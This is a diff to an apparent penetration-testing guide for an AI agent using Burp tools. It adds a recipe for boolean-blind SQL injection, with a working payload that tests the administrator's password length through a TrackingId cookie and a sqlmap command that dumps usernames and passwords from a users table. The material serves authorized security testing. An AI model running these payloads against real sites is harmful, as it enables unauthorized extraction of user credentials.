@@ -101,6 +101,12 @@ Each class has a SPECIFIC bar. Without it, the finding is NOT confirmed.
 - **Blind OOB:** Collaborator DNS/HTTP via `auto_collaborator_test`
 - **NOT sufficient:** status code alone, generic error page, length without error string or boolean stability
 
+**Boolean-blind extraction recipe** (injectable string context that appends a closing `'`, e.g. a `TrackingId` cookie):
+- The original query wraps the value in `'…'`. A payload ending in a bare number (`…AND LENGTH(password)=20`) becomes `20'` → SQL error → every probe reads FALSE and looks "not vulnerable". Keep the **outer** comparison a string so the trailing `'` closes cleanly: push the numeric test inside the WHERE and compare a known column back —
+  `x' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator`
+- Oracle = presence of the TRUE-marker (`Welcome back`) or a stable content delta; capture the clean-value byte length once and diff against it.
+- **Volume belongs to a tool, not hand-crafting.** First-class path: `blind_sqli_extract(url, template, oracle, injection='cookie:TrackingId', dbms=...)` — binary-searches length + every char through Burp, boolean (`oracle={'type':'content','true_marker':'Welcome back'}`) or error (`oracle={'type':'status','true_status':500}`) oracle, and refuses up front if a `1=1`/`1=2` sanity gate can't separate TRUE from FALSE (the trailing-quote failure above). `run_sqlmap` (routes through Burp) is the alternative for full dumps: `--technique=BE --string='Welcome back' -T users -C username,password --dump`. A raw local script through the Windows/WSL proxy socket drops HTTPS CONNECTs above ~1 concurrent — stay on the MCP tools.
+
 ### XSS
 - **Reflected:** payload UNENCODED in body in executable context
 - **Stored:** payload appears on a DIFFERENT page after submission
